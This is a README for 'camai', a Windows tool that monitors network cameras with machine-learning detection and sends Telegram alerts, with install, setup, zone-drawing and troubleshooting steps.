# 📹 camai - Smart home security monitoring tool

[![Download camai](https://img.shields.io/badge/Download_camai-Blue-blue)](https://github.com/benjismith677-png/camai/releases)

Camai turns your computer into a security control center. It works with cameras linked to your network to detect people and objects in real time. You get instant alerts on your phone whenever the software spots action in your home or office. It ignores normal movement and focuses on what matters.

## 🛠 Features

*   **Smart Detection:** Uses advanced machine learning to identify people, animals, and vehicles.
*   **Camera Support:** Connects to standard RTSP network cameras and Dahua DVR systems.
*   **Zone Alerts:** Define specific areas in your camera view to monitor. You receive alerts only when movement happens inside these zones.
*   **Remote Notifications:** Sends alerts directly to your Telegram account.
*   **Local Processing:** Keeps your video data on your machine to protect your privacy.

## 💻 System Requirements

*   **OS:** Windows 10 or Windows 11 (64-bit).
*   **Processor:** Intel Core i5 or AMD Ryzen 5 processor.
*   **Memory:** 8 GB RAM.
*   **Storage:** 500 MB for the application plus space for video clips.
*   **Graphics:** Dedicated graphics card with at least 2 GB of memory improves performance.
*   **Network:** Stable Ethernet or Wi-Fi connection to the local network where your cameras reside.

## 📥 How to Install

1.  Visit the [official releases page](https://github.com/benjismith677-png/camai/releases) to download the installer.
2.  Locate the file labeled `camai-setup.exe` in your Downloads folder.
3.  Double-click the file to start the installation process.
4.  Follow the prompts on your screen. Click "Next" through the installer steps.
5.  Select "Install" to place the application on your drive.
6.  Launch the application from your Start Menu after the installer finishes.

## ⚙️ Setting Up Your Cameras

The first time you run camai, you must add your cameras to the system.

1.  Open the application.
2.  Click the "Settings" tab at the top of the window.
3.  Choose the "Camera" menu.
4.  Click the "Add New Camera" button.
5.  Enter a name for the camera to help you identify it.
6.  Input the RTSP stream URL for your device. If you use a Dahua DVR, ensure the IP address and port match your network settings.
7.  Provide the username and password for your camera if the device requires login credentials.
8.  Press "Save Camera." The application will attempt to show a live preview.

## 🔔 Configuring Telegram Alerts

Camai uses Telegram to send you photo clips when the software notices movement.

1.  Open the "Notifications" tab in the Settings menu.
2.  Click "Enable Telegram Notifications."
3.  Download the Telegram app on your phone if you do not have it.
4.  Use the "BotFather" inside Telegram to create a new bot and obtain your API Token.
5.  Paste your API Token into the field labeled "Telegram API Token" inside camai.
6.  Enter your Chat ID to ensure the software sends alerts only to you.
7.  Click "Test Connection" to receive a sample message on your phone.

## 🎯 Defining Activity Zones

Zones help the system ignore common movement like swaying branches.

1.  Go to the "Zones" tab.
2.  Select your camera from the dropdown menu.
3.  Click "Draw New Zone" on the video preview.
4.  Click points on the screen to outline the area you want to watch. 
5.  Double-click to finish drawing the shape.
6.  Adjust the sensitivity slider to change how strictly the system watches that area.
7.  Click "Save Zone Settings."

## 🕵️ Troubleshooting

*   **No Stream Found:** Confirm your camera is powered on and connected to the same network as your computer. Double-check the RTSP URL format.
*   **High CPU Usage:** The AI models process a lot of data. Close other demanding software while running camai. Ensure your computer meets the recommended memory requirements.
*   **Notifications Fail:** Verify your internet connection. Confirm the Telegram API Token and Chat ID are correct.
*   **Slow Detections:** Ensure your camera has a clear view and a stable frame rate. High-resolution streams can slow down the detection process. Use a 1080p resolution for best balance between quality and speed.
*   **Update Issues:** Check the release page regularly for newer versions. Older versions may lack security patches or performance improvements.

## 🛡 Privacy and Security

You control your data. Camai processes all video feeds locally on your computer. The software does not upload video to any cloud server. The only external communication involves sending alert messages through the Telegram service. Keep your computer and your network password secure to prevent unauthorized access to your camera feeds. Use a strong password for your Windows account and your camera devices. Regular software updates keep your system safe and stable.